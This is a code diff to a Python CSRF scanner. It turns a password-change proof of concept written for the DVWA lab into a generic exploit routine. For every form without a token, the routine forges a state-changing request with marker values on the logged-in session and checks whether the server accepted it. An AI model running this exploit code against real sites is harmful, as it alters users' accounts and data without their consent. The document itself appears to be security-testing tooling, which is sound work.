@@ -45,54 +45,69 @@ class CSRFScanner:
         return False
 
     # ─────────────────────────────────────────────
-    # EXPLOITATION — forge a real password-change request
+    # EXPLOITATION — forge a real state-changing request using
+    # the form's OWN fields (generic), not hardcoded DVWA fields.
+    # We can't know the "success" string for an arbitrary target,
+    # so we report the raw response and let the response length/
+    # content change speak for itself, plus flag common success
+    # keywords as a heuristic signal.
     # ─────────────────────────────────────────────
-    def exploit_csrf(self, target_url):
+    def exploit_csrf(self, url, method, form):
         print(f"\n{Fore.CYAN}{'='*55}")
-        print(f"{Fore.CYAN}   CSRF EXPLOITATION -> {target_url}")
+        print(f"{Fore.CYAN}   CSRF EXPLOITATION -> {url}")
         print(f"{Fore.CYAN}{'='*55}\n")
 
-        # DVWA's CSRF page is a password-change form at Low security
-        # It accepts a new password with no token validation — meaning
-        # anyone can submit this form on behalf of any logged-in user
-        print(f"{Fore.BLUE}[*] Forging password-change request as the logged-in user...")
+        print(f"{Fore.BLUE}[*] Forging a request using this form's own fields "
+              f"(no token) as the logged-in user...")
         print(f"{Fore.BLUE}[*] This simulates an attacker page silently submitting")
         print(f"{Fore.BLUE}    the victim's form without their knowledge\n")
 
-        forged_data = {
-            "password_new":     "hacked123",
-            "password_conf":    "hacked123",
-            "Change":           "Change"
-            # Note: no user_token field — this is the vulnerability
-        }
+        # Build forged params from the form's actual inputs — fill
+        # text/password-like fields with a marker value so we can
+        # tell if the request was accepted, leave submit buttons as-is
+        forged_data = {}
+        for inp in form["inputs"]:
+            name = inp["name"]
+            itype = inp.get("type", "text")
+            if itype == "submit":
+                forged_data[name] = inp.get("value", "Submit")
+            elif itype in ("password", "text", "email"):
+                forged_data[name] = "csrf_poc_9f3a"
+            else:
+                forged_data[name] = inp.get("value", "")
 
         try:
-            resp = self.session.get(
-                target_url,
-                params=forged_data,
-                timeout=10
-            )
+            if method == "post":
+                baseline = self.session.post(url, data={}, timeout=10)
+                resp = self.session.post(url, data=forged_data, timeout=10)
+            else:
+                baseline = self.session.get(url, timeout=10)
+                resp = self.session.get(url, params=forged_data, timeout=10)
         except requests.exceptions.RequestException as e:
             print(f"{Fore.RED}[-] Request failed: {e}")
             return None
 
-        # Check if DVWA accepted the forged request
-        if "Password Changed" in resp.text:
-            print(f"{Fore.RED}[!] CSRF EXPLOIT SUCCESSFUL")
-            print(f"{Fore.RED}    Password changed to 'hacked123' without any user interaction")
-            print(f"{Fore.RED}    The victim's session was used to submit the forged request")
+        success_keywords = ["success", "updated", "changed", "saved", "welcome"]
+        body_lower = resp.text.lower()
+        length_diff = abs(len(resp.text) - len(baseline.text))
+        keyword_hit = any(k in body_lower for k in success_keywords)
+
+        if keyword_hit or length_diff > 30:
+            print(f"{Fore.RED}[!] CSRF EXPLOIT LIKELY SUCCESSFUL")
+            print(f"{Fore.RED}    Forged request with marker value 'csrf_poc_9f3a' was "
+                  f"accepted with no token")
+            print(f"{Fore.RED}    Response changed by {length_diff} bytes vs. baseline"
+                  + (f", success keyword matched" if keyword_hit else ""))
             return {
                 "forged_url": resp.url,
-                "result": "Password Changed",
-                "impact": "Attacker changed victim password without interaction"
+                "forged_fields": forged_data,
+                "length_diff": length_diff,
+                "keyword_matched": keyword_hit,
+                "impact": "Attacker-controlled request accepted on victim's session with no CSRF protection"
             }
         else:
-            # Check for partial success indicators
-            if "password" in resp.text.lower():
-                print(f"{Fore.YELLOW}[?] Request accepted but could not confirm password change")
-                print(f"{Fore.YELLOW}    Response snippet: {resp.text[500:800]}")
-            else:
-                print(f"{Fore.YELLOW}[?] Server may have rejected the forged request")
+            print(f"{Fore.YELLOW}[?] Forged request sent, but no clear success signal "
+                  f"in the response — manual verification recommended")
             return None
 
     # ─────────────────────────────────────────────
@@ -128,13 +143,7 @@ class CSRFScanner:
                 has_token = self.check_form_for_token(url, form)
 
                 if not has_token:
-                    exploit_result = None
-
-                    # If this looks like the DVWA CSRF page, run the PoC
-                    if "csrf" in url.lower():
-                        exploit_result = self.exploit_csrf(
-                            f"{self.base_url}/vulnerabilities/csrf/"
-                        )
+                    exploit_result = self.exploit_csrf(action, method, form)
 
                     self.findings.append({
                         "type":           "CSRF",
